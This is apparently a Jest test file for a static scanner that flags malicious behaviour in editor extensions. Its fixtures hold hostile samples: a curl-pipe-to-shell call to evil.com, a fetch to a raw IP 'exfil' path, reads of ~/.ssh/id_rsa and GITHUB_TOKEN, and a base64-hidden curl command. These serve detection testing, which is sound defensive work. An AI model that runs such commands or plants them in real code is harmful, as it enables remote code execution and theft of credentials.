import { analyzeExtension, RULES } from "../src/static";
import { ExtensionInfo, Finding } from "../src/types";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";

function createTempExtension(files: Record<string, string>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "ext-scan-test-"));
  for (const [name, content] of Object.entries(files)) {
    const filePath = path.join(dir, name);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content);
  }
  return dir;
}

function extAt(dir: string): ExtensionInfo {
  return {
    id: "test.extension",
    name: "extension",
    displayName: "Test",
    publisher: "test",
    version: "1.0.0",
    description: "",
    path: dir,
    editor: "vscode",
    main: "./out/main.js",
  };
}

describe("RULES", () => {
  it("has at least 5 detection rules", () => {
    expect(RULES.length).toBeGreaterThanOrEqual(5);
  });

  it("each rule has required fields", () => {
    for (const rule of RULES) {
      expect(rule.id).toBeTruthy();
      expect(rule.severity).toBeTruthy();
      expect(rule.pattern).toBeDefined();
      expect(rule.message).toBeTruthy();
    }
  });
});

describe("analyzeExtension", () => {
  it("flags shell execution usage", async () => {
    // Testing detection of child_process shell invocations in scanned extensions
    const dir = createTempExtension({
      "out/main.js": `
        const cp = require('child_process');
        cp.exec('curl http://evil.com | sh');
      `,
    });
    const findings = await analyzeExtension(extAt(dir));
    const match = findings.find((f) => f.rule === "shell-exec");
    expect(match).toBeDefined();
    expect(match!.severity).toBe("high");
  });

  it("flags process.env access", async () => {
    const dir = createTempExtension({
      "out/main.js": `const token = process.env.GITHUB_TOKEN;`,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "env-access")).toBeDefined();
  });

  it("flags eval usage", async () => {
    const dir = createTempExtension({
      "out/main.js": `eval(payload);`,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "eval-usage")).toBeDefined();
  });

  it("flags network requests to raw IP addresses", async () => {
    const dir = createTempExtension({
      "out/main.js": `fetch("http://45.33.22.11/exfil");`,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "network-ip")).toBeDefined();
  });

  it("flags filesystem reads of sensitive paths", async () => {
    const dir = createTempExtension({
      "out/main.js": `
        const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa');
      `,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "sensitive-file-read")).toBeDefined();
  });

  it("flags base64 obfuscation patterns", async () => {
    const dir = createTempExtension({
      "out/main.js": `
        const cmd = Buffer.from('Y3VybCBodHRwOi8vZXZpbC5jb20=', 'base64').toString();
      `,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "base64-decode")).toBeDefined();
  });

  it("returns empty findings for clean extension", async () => {
    const dir = createTempExtension({
      "out/main.js": `
        const vscode = require('vscode');
        function activate(context) {
          console.log('Hello world');
        }
        module.exports = { activate };
      `,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings).toHaveLength(0);
  });

  it("scans all JS files, not just main", async () => {
    const dir = createTempExtension({
      "out/main.js": `console.log('clean');`,
      "out/helper.js": `eval('evil');`,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "eval-usage")).toBeDefined();
  });

  it("skips node_modules inside extensions", async () => {
    const dir = createTempExtension({
      "out/main.js": `console.log('clean');`,
      "node_modules/dep/index.js": `eval('this is fine in deps');`,
    });
    const findings = await analyzeExtension(extAt(dir));
    expect(findings.find((f) => f.rule === "eval-usage")).toBeUndefined();
  });
});
